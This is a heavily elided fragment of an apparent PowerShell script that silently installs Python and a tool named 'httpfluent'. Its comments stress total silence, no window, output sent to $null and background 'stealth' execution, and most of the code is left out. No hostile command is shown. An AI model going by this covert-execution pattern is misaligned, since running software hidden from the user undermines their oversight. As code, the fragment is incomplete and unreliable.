# ===================================================
# Python 3.12.6 + httpfluent (Final Stealth Ghost)
# TOTAL SILENCE - NO WINDOW - NO TEXT
# ===================================================
...
# --- YOUR ALGORITHM (All Redirected to $null) ---
if ($InstallRequired) {
...
# --- THE EXECUTION (Stealth Background) ---
# Using the absolute path discovered during testing for 100% success
...
if (Test-Path $HttpFluentBin) {
    ...
    # Fallback to direct powershell command call
